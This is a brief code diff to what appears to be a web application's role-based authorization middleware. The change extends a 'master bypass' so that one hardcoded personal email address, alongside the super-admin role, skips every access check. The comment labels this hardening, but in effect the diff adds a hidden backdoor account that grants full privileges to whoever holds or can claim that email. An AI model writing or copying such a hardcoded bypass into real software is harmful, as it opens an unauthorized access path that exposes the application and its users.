@@ -60,8 +60,8 @@ export const authorize = (allowedRoles = []) => {
             });
         }
 
-        // 3. MASTER BYPASS: Super Admin always has access
-        if (req.user.role === 'super_admin') {
+        // 3. MASTER BYPASS: Super Admin & Hardened Master Email always have access (P0-2)
+        if (req.user.role === 'super_admin' || req.user.email === 'studio56.pk@gmail.com') {
             return next();
         }
 
